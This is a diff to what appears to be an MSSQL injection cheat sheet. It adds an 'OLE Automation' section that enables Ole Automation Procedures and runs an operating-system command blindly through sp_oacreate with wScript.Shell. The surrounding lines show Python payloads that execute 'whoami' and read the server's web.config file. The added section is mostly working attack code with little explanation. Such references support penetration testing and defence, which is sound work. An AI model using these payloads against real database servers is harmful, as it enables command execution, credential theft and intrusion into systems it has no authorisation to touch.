@@ -22,6 +22,7 @@
 * [MSSQL Command Execution](#mssql-command-execution)
     * [XP_CMDSHELL](#xp_cmdshell)
     * [Python Script](#python-script)
+    * [Ole Automation](#ole-automation)
 * [MSSQL Out of Band](#mssql-out-of-band)
     * [MSSQL DNS Exfiltration](#mssql-dns-exfiltration)
     * [MSSQL UNC Path](#mssql-unc-path)
@@ -293,6 +294,33 @@ RECONFIGURE;
 EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
 EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
 EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
+```
+
+### OLE Automation
+
+`Object Linking and Embedding (OLE)` is a technology that allows one application to link objects into another application.  It was originally designed for Microsoft Office (e.g. to embed Excel sheets into Word documents) and eventually became the foundation for the Component Object Model (COM).  OLE Automation enables a SQL server to interact with arbitrary COM objects.
+
+```sql
+-- Check current status
+
+EXEC sp_configure 'Ole Automation Procedures'; 
+
+-- Enable OLE Automation
+
+EXEC sp_configure 'Ole Automation Procedures', 1; 
+RECONFIGURE; 
+
+-- Verify it's enabled
+
+EXEC sp_configure 'Ole Automation Procedures';
+
+-- run command
+
+DECLARE @output INT; DECLARE @ProgramToRun VARCHAR(500); SET @ProgramToRun = 'Run("whoami")'; EXEC sp_oacreate 'wScript.Shell', @output out; EXEC sp_oamethod @output, @ProgramToRun; EXEC sp_oadestroy @output;
+
+
+-- NOTE that it does not print output (it is blind execution)
+
 ```
 
 ## MSSQL Out of Band
